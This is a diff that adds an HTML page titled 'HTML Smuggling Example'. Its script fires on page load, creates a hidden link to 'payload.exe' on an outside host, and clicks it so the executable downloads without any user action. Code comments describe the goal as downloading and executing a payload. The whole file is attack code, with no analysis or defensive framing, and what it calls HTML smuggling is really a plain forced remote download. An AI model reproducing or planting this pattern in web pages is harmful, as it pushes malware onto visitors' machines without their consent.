@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>HTML Smuggling Example</title>
+</head>
+<body>
+    <h1>HTML Smuggling Example</h1>
+    <script>
+        // Function to download and execute a payload
+        function downloadAndExecute() {
+            // URL of the payload to download
+            var payloadUrl = "https://example.com/payload.exe";
+
+            // Create an anchor element to trigger the download
+            var anchor = document.createElement('a');
+            anchor.href = payloadUrl;
+            anchor.download = "payload.exe";
+
+            // Append the anchor to the body and click it
+            document.body.appendChild(anchor);
+            anchor.click();
+
+            // Remove the anchor from the document
+            document.body.removeChild(anchor);
+
+            // Optionally, execute the payload (not possible directly from the browser for security reasons)
+            // This would typically require additional steps or user interaction
+        }
+
+        // Execute the function when the page loads
+        window.onload = downloadAndExecute;
+    </script>
+</body>
+</html>
